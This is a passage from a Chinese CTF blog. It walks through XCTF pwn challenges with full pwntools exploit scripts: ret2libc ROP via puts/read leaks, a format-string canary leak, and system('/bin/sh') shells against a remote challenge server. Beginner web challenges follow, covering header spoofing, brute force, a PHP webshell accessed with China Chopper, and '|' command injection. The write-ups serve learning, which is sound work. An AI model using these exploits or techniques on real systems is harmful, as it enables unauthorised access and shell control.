<img src="/2019/09/13/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6/1568260146451.png" class="" width="1568260146451">
<img src="/2019/09/13/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6/1568265875900.png" class="" width="1568265875900">
<p>v1存在栈溢出漏洞。程序中没有system函数，没有/bin/sh，由于是64位程序，所以需要利用ROP来传参数，关于ROP的学习，推荐个大佬的博客：<a
href="https://chybeta.github.io/2017/06/26/ROP学习：64位栈溢出/">ROP学习：64位栈溢出</a>。</p>
<p>程序中有read，puts，所以思路是调用puts把read的绝对地址泄露出来然后找到libc版本和偏移量把system和/bin/sh的地址找到，再调用system，传入/bin/sh拿到shell。参数通过ROP方法传递。</p>
<p>首先寻找ROP：</p>
<img src="/2019/09/13/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6/1568261009433.png" class="" width="1568261009433">
<p>由于我们要用的puts和system函数都只需要一个参数，所以只需要rdi就可以。pop
rdi; ret 的地址为0x0000000000400763。</p>
<p>exp如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;../files/pwn-100&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;111.198.29.45&#x27;</span>, <span class="number">30013</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;../files/pwn-100&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">vuln = <span class="number">0x40068e</span> <span class="comment">#是sub_40068E()的地址</span></span><br><span class="line">read_got = e.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">puts_plt = e.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">pop_rdi = <span class="number">0x0000000000400763</span></span><br><span class="line"></span><br><span class="line">log.success(<span class="string">&#x27;read_got_addr =&gt; &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(read_got)))</span><br><span class="line">log.success(<span class="string">&#x27;puts_plt_addr =&gt; &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(puts_plt)))</span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">&#x27;a&#x27;</span> * <span class="number">0x48</span> </span><br><span class="line">payload1 += p64(pop_rdi) + p64(read_got) + p64(puts_plt) <span class="comment">#把read_got传入rdi，然后调用puts，puts把read_got打印出来</span></span><br><span class="line">payload1 += p64(vuln) <span class="comment">#返回sub_40068E()函数准备第二次继续攻击</span></span><br><span class="line">payload1 += <span class="string">&#x27;a&#x27;</span> * (<span class="number">200</span> - <span class="built_in">len</span>(payload1)) <span class="comment">#程序要求一次需要输入200个字符，所以最后填满</span></span><br><span class="line"></span><br><span class="line">p.send(payload1)</span><br><span class="line">p.recv()  <span class="comment">#回显bye~</span></span><br><span class="line">read_leak = u64(p.recv()[<span class="number">1</span>:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">&#x27;\0&#x27;</span>)) <span class="comment">#得到read的绝对坐标</span></span><br><span class="line">log.success(<span class="string">&#x27;read_leak_addr =&gt; &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(read_leak)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;read&#x27;</span>, read_leak)</span><br><span class="line">libc_base = read_leak - libc.dump(<span class="string">&#x27;read&#x27;</span>)</span><br><span class="line">sys_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh_addr = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;system_addr:&#x27;</span>, <span class="built_in">hex</span>(sys_addr)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;bin_sh_addr:&#x27;</span>, <span class="built_in">hex</span>(bin_sh_addr)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">&#x27;a&#x27;</span> * <span class="number">0x48</span></span><br><span class="line">payload2 += p64(pop_rdi) + p64(bin_sh_addr) + p64(sys_addr)  <span class="comment">#system(&#x27;/bin/sh&#x27;)</span></span><br><span class="line">payload2 += <span class="string">&#x27;a&#x27;</span> * (<span class="number">200</span> - <span class="built_in">len</span>(payload2))</span><br><span class="line"></span><br><span class="line">p.send(payload2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>执行exp，选择libc版本选0，得到shell：</p>
<img src="/2019/09/13/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6/1568302057127.png" class="" width="1568302057127">
<p>得到flag：</p>
<img src="/2019/09/13/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6/1568266254184.png" class="" width="1568266254184">
<h1 id="mary_morton">mary_morton</h1>
<p>题目描述：非常简单的热身pwn</p>
<p>首先看一下源码：</p>
<img src="/2019/09/13/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6/1572066823941.png" class="" width="1572066823941">
<img src="/2019/09/13/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6/1572066856025.png" class="" width="1572066856025">
<p>可以看到我们可以选择栈溢出漏洞或者是格式化字符串漏洞。</p>
<p>首先看一下栈溢出漏洞：</p>
<img src="/2019/09/13/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6/1572066925488.png" class="" width="1572066925488">
<p>buf是很典型的栈溢出。</p>
<p>再看一下格式化字符串漏洞：</p>
<img src="/2019/09/13/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6/1572066976502.png" class="" width="1572066976502">
<p>也是很典型的格式化字符串漏洞。</p>
<p>程序中还有一个目标函数：</p>
<img src="/2019/09/13/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6/1572067033370.png" class="" width="1572067033370">
<p>那么思路很明确，就是栈溢出让程序返回到cat_flag（名字是我改的）得到flag就行了。但是这个程序有个问题，它开启了canary保护。</p>
<img src="/2019/09/13/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6/1572067142663.png" class="" width="1572067142663">
<p>所以我们没办法直接进行栈溢出，否则就会报错，因此我们要绕过canary保护，这方面知识可以看<a
href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/mitigation/canary-zh/">CTFwiki</a>。</p>
<p>要绕过canary保护，其中一种方式是知道canary是多少，程序中可以看到canary的偏移量是0x90-8=0x88：</p>
<img src="/2019/09/13/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6/1572067798113.png" class="" width="1572067798113">
<img src="/2019/09/13/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6/1572067814376.png" class="" width="1572067814376">
<p>那么思路就是我们通过格式化字符串漏洞得知canary的值然后在栈溢出的时候把canary写进去，这样就可以绕过canary保护。</p>
<p>要想知道canary的值，就得知道canary在内存中的地址，我们通过代码可以知道格式化字符串的偏移量是6，而我们输入参数（buf）和canary之间的偏移为0x90
- 8 = 0x88字节，八个字节为一组，0x88 / 8 =
17，也就是说格式化字符串到canary的偏移是17+6=23，那么我们用<code>%23$p</code>就可以看到偏移量为23的内存的内容了。这样就可以得到canary。后面就是简单的栈溢出了。</p>
<p>构造exp如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;111.198.29.45&#x27;</span>,<span class="number">58615</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;../files/mary_morton&#x27;)</span></span><br><span class="line">e = ELF(<span class="string">&#x27;../files/mary_morton&#x27;</span>)</span><br><span class="line"></span><br><span class="line">get_flag = <span class="number">0x4008da</span></span><br><span class="line">format_offset = <span class="number">6</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;%23$p&quot;</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;battle&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">canary = <span class="built_in">int</span>(p.recv(<span class="number">16</span>),<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;battle&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">&#x27;a&#x27;</span> * <span class="number">0x88</span> + p64(canary) + <span class="string">&#x27;a&#x27;</span> * <span class="number">8</span> + p64(get_flag)</span><br><span class="line"></span><br><span class="line">p.sendline(payload2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>得到flag：</p>
<img src="/2019/09/13/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6/1572067848834.png" class="" width="1572067848834">
<h1 id="monkey">monkey</h1>
<p>这个题给了个js，打开之后是一个js
shell，由于我不会js，我刚开始看的时候毫无头绪，还是用传统的方法打开IDA分析，啥也没看出来。后来发现这个题其实如果你知道js相关的知识就很简单了，js有个os.system函数，直接os.system("/bin/sh")就可以获取shell了。</p>
<img src="/2019/09/13/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6/image-20191030110610797.png" class="" title="image-20191030110610797">
<h1 id="pwn1">pwn1</h1>
<img src="/2019/09/13/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6/image-20191102091949539.png" class="" title="image-20191102091949539">
<p>先运行看看：</p>
<img src="/2019/09/13/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6/image-20191102092031860.png" class="" title="image-20191102092031860">
<p>IDA打开看一下源码：</p>
<img src="/2019/09/13/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6/image-20191102091742929.png" class="" title="image-20191102091742929">
<p>可以看到一个典型的栈溢出，要构造的肯定是&amp;s了。这个题没有现成的获取flag目标函数，因此我们就需要ROP。同时这个题有canary，因此我们需要绕过canary。</p>
<p>看一下&amp;s：</p>
<img src="/2019/09/13/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6/image-20191102160837726.png" class="" title="image-20191102160837726">
<img src="/2019/09/13/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6/image-20191102160909600.png" class="" title="image-20191102160909600">
<p>var_8就是我们要获取的canary。</p>
<p>main函数的起始地址是0x400908。</p>
<p>那么思路就是首先通过puts得到canary，然后通过puts爆出read的真实地址，找到libc，然后在用libc中的system和/bin/sh反弹shell。要注意的一点就是canary的最后两位不是0a，而是，因为我们在构造的时候输入0x88个a时还输入了一个回车，这个回车把canary最后的00覆盖成了0a。正是这个覆盖才让puts能输出canary。</p>
<p>64位通过rdi传参，首先获得rdi地址：</p>
<img src="/2019/09/13/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6/image-20191102160330688.png" class="" title="image-20191102160330688">
<p>exp如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;../files/babystack&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;111.198.29.45&#x27;</span>, <span class="number">56221</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;../files/babystack&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rdi_addr = <span class="number">0x0000000000400a93</span></span><br><span class="line">start = <span class="number">0x400908</span></span><br><span class="line"></span><br><span class="line">puts_plt = e.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">read_got = e.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&#x27;puts_plt_addr =&gt; &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(puts_plt)))</span><br><span class="line">log.success(<span class="string">&#x27;read_got_addr =&gt; &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(read_got)))</span><br><span class="line"></span><br><span class="line"><span class="comment">#found canary</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&gt; &#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">0x88</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&gt; &#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;a&#x27;</span> * <span class="number">0x88</span> + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">canary = u64(p.recv(<span class="number">7</span>).rjust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">log.success(<span class="string">&#x27;canary =&gt; &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(canary)))</span><br><span class="line"></span><br><span class="line"><span class="comment">#found real_read_address</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&gt; &#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">0x88</span> + p64(canary) + <span class="string">&#x27;a&#x27;</span> * <span class="number">8</span> + p64(rdi_addr) + p64(read_got) + p64(puts_plt)</span><br><span class="line">payload += p64(start)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&gt; &#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">real_read = u64(p.recv(<span class="number">8</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">log.success(<span class="string">&#x27;real_read_address =&gt; &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(real_read)))</span><br><span class="line"></span><br><span class="line"><span class="comment">#ROP</span></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;read&#x27;</span>,real_read)</span><br><span class="line">libc_base = real_read - libc.dump(<span class="string">&#x27;read&#x27;</span>)</span><br><span class="line">sys_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh_addr = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">log.success(<span class="string">&#x27;libc_base_addr =&gt; &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(libc_base)))</span><br><span class="line">log.success(<span class="string">&#x27;system_addr =&gt; &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(sys_addr)))</span><br><span class="line">log.success(<span class="string">&#x27;bin_sh_addr =&gt; &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(bin_sh_addr)))</span><br><span class="line"></span><br><span class="line"><span class="comment">#get_shell</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&gt; &#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">0x88</span> + p64(canary) + <span class="string">&#x27;a&#x27;</span> * <span class="number">8</span> + p64(rdi_addr) + p64(bin_sh_addr) + p64(sys_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&gt; &#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>运行，选择题目给的libc，得到flag：</p>
<img src="/2019/09/13/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6/image-20191102160654357.png" class="" title="image-20191102160654357">
]]></content>
      <categories>
        <category>CTF</category>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>攻防世界web新手训练</title>
    <url>/2020/07/17/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/</url>
    <content><![CDATA[<h1 id="view_source">view_source</h1>
<p>F12看源码</p>
<img src="/2020/07/17/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/image-20200717105543297.png" class="" title="image-20200717105543297">
<h1 id="get_post">get_post</h1>
<p>进入链接后提示如下：</p>
<img src="/2020/07/17/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/image-20200717105042516.png" class="" title="image-20200717105042516">
<p>构造url</p>
<img src="/2020/07/17/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/image-20200717105235135.png" class="" title="image-20200717105235135">
<p>提交后提示如下：</p>
<img src="/2020/07/17/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/image-20200717105348157.png" class="" title="image-20200717105348157">
<p>再次构造url</p>
<img src="/2020/07/17/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/image-20200717105410671.png" class="" title="image-20200717105410671">
<p>提交得到flag</p>
<img src="/2020/07/17/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/image-20200717105433487.png" class="" title="image-20200717105433487">
<h1 id="robots">robots</h1>
<p>进入链接后什么都没有</p>
<p>看看robots.txt</p>
<img src="/2020/07/17/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/image-20200717105816695.png" class="" title="image-20200717105816695">
<p>可以看到disallow的位置就是我们要找的flag</p>
<img src="/2020/07/17/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/image-20200717105903647.png" class="" title="image-20200717105903647">
<h1 id="backup">backup</h1>
<img src="/2020/07/17/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/image-20200717110737642.png" class="" title="image-20200717110737642">
<p>看到index.php，我们看看</p>
<img src="/2020/07/17/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/image-20200717110832971.png" class="" title="image-20200717110832971">
<p>发现没有什么变化，那么根据提示，我们看看备份文件，一般备份文件的后缀是.bak</p>
<img src="/2020/07/17/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/image-20200717110927693.png" class="" title="image-20200717110927693">
<p>当我们输入index.php.bak时可以下载该文件，下载后打开，得到flag</p>
<img src="/2020/07/17/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/image-20200717111007209.png" class="" title="image-20200717111007209">
<h1 id="cookie">cookie</h1>
<img src="/2020/07/17/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/image-20200717111232613.png" class="" title="image-20200717111232613">
<p>抓包看看</p>
<img src="/2020/07/17/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/image-20200717111309876.png" class="" title="image-20200717111309876">
<p>那我们就看看cookie.php</p>
<img src="/2020/07/17/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/image-20200717111344601.png" class="" title="image-20200717111344601">
<p>提示我们看看响应包，得到flag</p>
<img src="/2020/07/17/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/image-20200717111438468.png" class="" title="image-20200717111438468">
<h1 id="disabled_button">disabled_button</h1>
<img src="/2020/07/17/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/image-20200717113546553.png" class="" title="image-20200717113546553">
<p>看看这个按钮</p>
<img src="/2020/07/17/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/image-20200717113711469.png" class="" title="image-20200717113711469">
<p>可以看到这个按钮的作用实际上就是post传递一个auth=flag，那么我们自己传这样一个参数，得到flag</p>
<img src="/2020/07/17/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/image-20200717113819628.png" class="" title="image-20200717113819628">
<h1 id="weak_auth">weak_auth</h1>
<p>进入后是一个登陆界面，随便输一个用户名密码</p>
<img src="/2020/07/17/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/image-20200717114325671.png" class="" title="image-20200717114325671">
<p>说明用户是admin</p>
<img src="/2020/07/17/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/image-20200717114352984.png" class="" title="image-20200717114352984">
<p>可以看到这个题就是暴力破解，那么放到burp suite里跑个字典</p>
<img src="/2020/07/17/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/image-20200717114500113.png" class="" title="image-20200717114500113">
<p>可以看到密码就是123456</p>
<img src="/2020/07/17/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/image-20200717114523421.png" class="" title="image-20200717114523421">
<p>得到flag</p>
<h1 id="simple_php">simple_php</h1>
<img src="/2020/07/17/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/image-20200717114651376.png" class="" title="image-20200717114651376">
<p>看php代码说明我们要构造a和b，让a和b的值都满足条件，就可以获得flag</p>
<p>那么首先看a，要a=0为真，a为真，所以a不可能等于0，要想解决这个问题，首先我们要知道php的特性。</p>
<p>由于php为弱类型语言，因此当不同类型的值进行==比较的时候会发生类型转换。正常情况下不同类型的值是不能比较的，php
为了比较进行了数据类型转换。把不同类型的值转换为相同类型后再比较。</p>
<p>具体转换规则可以看这篇文章《<a
href="https://www.cnblogs.com/beenupper/p/12635779.html">彻底解决php判断a==0为真引发的问题-类型转换</a>》，这里不再赘述。</p>
<p>知道了转换规则，那么我们就可以构造了，得到flag</p>
<img src="/2020/07/17/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/image-20200717115934924.png" class="" title="image-20200717115934924">
<h1 id="xff_referer">xff_referer</h1>
<p>进入后提示如下：</p>
<p>那么我们就在请求包中通过x-forwarded-for伪造ip</p>
<img src="/2020/07/17/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/image-20200717162612014.png" class="" title="image-20200717162612014">
<p>注意xff加入的位置，我之前加入到末尾发现页面一直在加载没有响应，我想xff写在请求头中间就好了。</p>
<p>然后发现提示变化：</p>
<img src="/2020/07/17/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/image-20200717161539728.png" class="" title="image-20200717161539728">
<p>那么在伪造referer</p>
<img src="/2020/07/17/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/image-20200717162711288.png" class="" title="image-20200717162711288">
<p>得到flag</p>
<img src="/2020/07/17/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/image-20200717162734141.png" class="" title="image-20200717162734141">
<h1 id="webshell">webshell</h1>
<img src="/2020/07/17/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/image-20200717170244887.png" class="" title="image-20200717170244887">
<p>php的一句话木马，使用中国菜刀连接，中国菜刀可以从这个<a
href="https://github.com/raddyfiy/caidao-official-version">地方</a>下载，</p>
<img src="/2020/07/17/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/image-20200717170319974.png" class="" title="image-20200717170319974">
<p>即可进入服务器</p>
<img src="/2020/07/17/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/image-20200717170345624.png" class="" title="image-20200717170345624">
<p>获得flag</p>
<img src="/2020/07/17/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/image-20200717170404876.png" class="" title="image-20200717170404876">
<p>当然，如果没有工具，那就手动构造请求post包</p>
<p>一句话木马中的变量是shell，所以我们传的变量就是shell</p>
<img src="/2020/07/17/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/image-20200717170710704.png" class="" title="image-20200717170710704">
<p>可以看到返回了当前路径的所有文件，看到了flag.txt</p>
<img src="/2020/07/17/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/image-20200717170754480.png" class="" title="image-20200717170754480">
<p>得到flag</p>
<h1 id="command_execution">command_execution</h1>
<img src="/2020/07/17/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/image-20200717172147730.png" class="" title="image-20200717172147730">
<p>尝试ping一下本机127.0.0.1</p>
<img src="/2020/07/17/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/image-20200717172220593.png" class="" title="image-20200717172220593">
<p>可以看到ping的结果返回到了页面，那么尝试命令注入</p>
<p>命令注入有很多种方法，可以参考这两篇文章：<a
href="https://blog.csdn.net/u014549283/article/details/81783164">文章1</a>，<a
href="https://blog.csdn.net/qq_41079177/article/details/88321816?depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-2.compare">文章2</a>，这里不再赘述</p>
<p>这道题比较简单，没有waf，不需要绕过，我使用 | 进行注入</p>
<p>command 1 | command 2 只执行command2</p>
